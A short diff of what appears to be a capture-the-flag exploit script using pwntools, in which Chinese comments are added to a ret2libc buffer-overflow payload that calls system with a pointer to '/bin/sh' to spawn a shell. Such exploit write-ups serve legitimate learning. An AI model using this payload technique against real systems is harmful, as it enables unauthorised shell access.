@@ -30,9 +30,9 @@ libc_system_address = 0x0003a940 + libc_base_address
 libc_binsh_address = 0x0015902b + libc_base_address
 payload = flat(
     b'a' * 0x8c,
-    libc_system_address,
-    1234,
-    libc_binsh_address,
+    libc_system_address, # 跳转地址
+    1234, # 返回地址
+    libc_binsh_address, # 参数1
 )
 p.sendlineafter(b'Input:\n', payload)
 
